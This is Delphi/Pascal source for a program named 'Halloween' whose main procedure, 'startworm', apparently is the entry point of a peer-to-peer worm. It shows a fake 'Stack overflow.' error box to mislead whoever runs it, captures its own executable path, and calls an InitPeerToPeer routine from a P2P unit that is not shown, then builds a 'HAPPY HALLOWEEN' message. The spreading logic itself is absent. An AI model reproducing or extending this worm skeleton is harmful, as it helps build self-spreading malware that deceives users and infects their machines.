   PROGRAM Halloween;

   {$APPTYPE GUI}

   USES
     AclUtils in 'ACLUnits\ACLUTILS.PAS',
     Registry in 'ACLUnits\REGISTRY.PAS',
     P2P      IN 'P2P.PAS',
     Windows;

   VAR
     hMainForm : HWND;
     FirstRun2 : BOOL;
     S : String;
     msg : tmsg;

   procedure startworm;
   begin
     Randomize;
     ApplicationName:=ParamStr(0);
     MessageBox(hMainForm,'Stack overflow.','Error',MB_ICONHAND);
     InitPeerToPeer;
     S:='HAPPY HALLOWEEN!!  HAPPY HALLOWEEN!! HAPPY HALLOWEEN!! HAPPY HALLOWEEN!! HAPPY HALLOWEEN!!  HAPPY HALLOWEEN!! HAPPY HALLOWEEN!! HAPPY HALLOWEEN!! HAPPY HALLOWEEN!!  HAPPY HALLOWEEN!! HAPPY HALLOWEEN!!';
     end;

   BEGIN
   startworm;

   END.
